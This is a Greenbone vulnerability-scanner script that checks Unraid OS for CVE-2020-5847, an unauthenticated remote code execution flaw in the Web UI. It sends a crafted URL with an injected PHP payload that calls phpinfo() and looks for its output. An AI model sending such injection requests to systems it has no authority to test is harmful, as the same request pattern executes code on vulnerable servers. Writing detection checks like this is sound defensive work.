# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:unraid:unraid";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143519");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2020-02-14 08:15:48 +0000 (Fri, 14 Feb 2020)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-04-17 17:15:00 +0000 (Fri, 17 Apr 2020)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2020-5847");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Unraid OS < 6.8.1 RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_unraid_http_detect.nasl");
  script_mandatory_keys("unraid/detected");
  script_require_ports("Services/www", 80, 443);

  script_tag(name:"summary", value:"Unraid OS is prone to a remote code execution (RCE)
  vulnerability over the Web UI.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"Unraid OS version 6.8.0 and prior.");

  script_tag(name:"solution", value:"Update to version 6.8.1 or later.");

  script_xref(name:"URL", value:"https://sysdream.com/news/lab/2020-02-06-cve-2020-5847-cve-2020-5849-unraid-6-8-0-unauthenticated-remote-code-execution-as-root/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20phpinfo();%20?%3E";

if (http_vuln_check(port: port, url: url, pattern: "PHP Version", check_header: TRUE, extra_check: "PHP API")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
